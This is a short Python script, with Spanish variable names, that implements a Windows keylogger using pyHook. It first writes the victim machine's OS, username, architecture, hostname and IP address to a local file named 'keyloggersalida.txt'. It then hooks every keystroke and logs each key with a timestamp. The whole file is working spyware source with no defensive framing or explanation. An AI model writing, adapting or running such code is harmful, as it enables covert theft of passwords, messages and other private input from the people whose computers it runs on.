import pyHook, pythoncom, sys, logging, socket
import platform as pl
from getpass import getuser

archivo_registro = 'keyloggersalida.txt'
perfil_so = [
    'architecture',
    'machine',
    'uname',
    ]

nombre_usuario = socket.gethostname()
direccion_ip = socket.gethostbyname(nombre_usuario)
so = pl.system()
machine = pl.machine()
usuario = getuser()

def DatosComputador():
    f = open(archivo_registro,'a')
    f.write('"OS" : "%s", \n' % so)
    f.write('"nombre_user" : "%s", \n' % usuario)
    f.write('"arquitectura" : "%s", \n' % machine)
    f.write('"nombre_PC" : "%s", \n' % nombre_usuario)
    f.write('"IP_adress" : "%s", \n' % direccion_ip)
    f.write('"Keys":[ \n')
    f.close()

def EventoTeclado(evento):
    logging.basicConfig(filename=archivo_registro, level=logging.DEBUG, format=' {"key": %(message)s, "time": %(asctime)s}')
    logging.log(10,chr(evento.KeyID))
    return True

def MainProcess():
    DatosComputador()
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = EventoTeclado
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

MainProcess()
